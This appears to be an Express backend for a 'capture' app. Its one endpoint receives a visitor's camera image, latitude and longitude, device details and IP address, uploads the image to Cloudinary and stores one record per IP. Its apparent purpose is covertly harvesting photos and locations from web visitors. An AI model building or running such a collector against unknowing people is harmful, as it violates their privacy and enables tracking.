import express from "express";
import bodyParser from "body-parser";
import { v2 as cloudinary } from "cloudinary";
import fs from "fs";
import cors from "cors";
import dotenv from "dotenv";
import { upload } from "./middleware/multer.js";
import { connectDb } from "./utils/Connnetdb.js";
import { InfoModel } from "./models/DeviceInfo.js";

dotenv.config();

const app = express();
// Configure CORS properly
const allowedOrigins = [
  "http://localhost:5173",
  "https://capture-frontend-ten.vercel.app",
  "https://q0xtw0c9-5173.inc1.devtunnels.ms"
];
// Middleware
app.use(
  cors({
    origin: allowedOrigins,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"],
    allowedHeaders: [
      "Content-Type",
      "Authorization",
      "X-Requested-With",
      "X-Last-Check",
    ],
    credentials: true,
    optionsSuccessStatus: 200,
  })
);
app.use(bodyParser.json({ limit: "10mb" }));

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Something went wrong!");
});

// API Route to handle image and location
app.get("/", (req, res) => {
  res.send("Backend is running successfully!");
});

app.post("/api/capture", upload.array("uploads"), async (req, res) => {
  const { image, location, deviceInfo, ipAddress } = req.body;

  try {
    cloudinary.config({
      cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
      api_key: process.env.CLOUDINARY_API_KEY,
      api_secret: process.env.CLOUDINARY_API_SECRET,
      secure: true,
    });

    // Prefer files from multer (req.files / req.file). Fallback to base64 `image` field.
    const files =
      req.files && req.files.length ? req.files : req.file ? [req.file] : [];

    const options = {
      use_filename: true,
      unique_filename: false,
      overwrite: false,
    };

    const uploadedUrls = [];

    // If no multipart files were sent but `image` (base64 or data URL) exists, upload it directly
    if (files.length === 0 && image) {
      try {
        const result = await cloudinary.uploader.upload(image, options);
        uploadedUrls.push(result.secure_url);
        console.log("Uploaded base64 image to Cloudinary");
      } catch (uploadError) {
        console.error("Error uploading base64 image:", uploadError);
      }
    }

    // If we do have multipart files, upload each from disk
    for (const file of files) {
      // some multer implementations place the path on `file.path`, others on `file.location` or `file.filename`
      const filePath = file.path || file.location || file.filename;
      if (!filePath) {
        console.error("Skipping file with missing path or location:", file);
        continue;
      }

      try {
        const result = await cloudinary.uploader.upload(filePath, options);
        uploadedUrls.push(result.secure_url);
        // Clean up temporary file after successful upload if it exists on disk
        if (fs.existsSync(filePath)) {
          try {
            fs.unlinkSync(filePath);
          } catch (e) {
            /* ignore cleanup errors */
          }
        }
        console.log(
          `Uploaded: ${file.originalname || file.filename || filePath}`
        );
      } catch (uploadError) {
        console.error(
          `Error uploading ${file.originalname || file.filename || filePath}:`,
          uploadError
        );
        // Clean up file even if upload failed
        if (fs.existsSync(filePath)) {
          try {
            fs.unlinkSync(filePath);
          } catch (e) {
            /* ignore cleanup errors */
          }
        }
      }
    }

    // Validate that we have an image URL
    if (!uploadedUrls[0]) {
      return res.status(400).json({
        status: "error",
        message: "No image uploaded successfully",
        error: true,
        success: false,
      });
    }

    // Check if this IP address already exists
    let existingInfo = await InfoModel.findOne({ ipAddress });

    if (existingInfo) {
      return res.json({
        message: "Data with this IpAddress already exists.",
        error: true,
        success: false,
      });
    }

    // Create new info document
    const newInfo = new InfoModel({
      imageUrl: uploadedUrls[0],
      location: {
        latitude: location?.latitude || 0,
        longitude: location?.longitude || 0,
      },
      deviceInfo:
        typeof deviceInfo === "object"
          ? JSON.stringify(deviceInfo)
          : deviceInfo,
      ipAddress,
    });

    await newInfo.save();

    // Respond with success
    console.log("Public URL:", uploadedUrls[0]);
    console.log("Location:", location);
    console.log("DeviceInfo:", deviceInfo);
    console.log("IpAddress:", ipAddress);
    res.send({
      status: "success",
      message: "Data captured!",
      imageUrl: uploadedUrls[0],
      location,
      deviceInfo,
      ipAddress,
    });
  } catch (error) {
    console.error("Error handling capture:", error);
    res.status(500).send({
      status: "error",
      message: "Failed to capture data",
      details: error.message,
    });
  }
});

// Start the server
const PORT = process.env.PORT || 5000;
connectDb().then(() => {
  app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
});
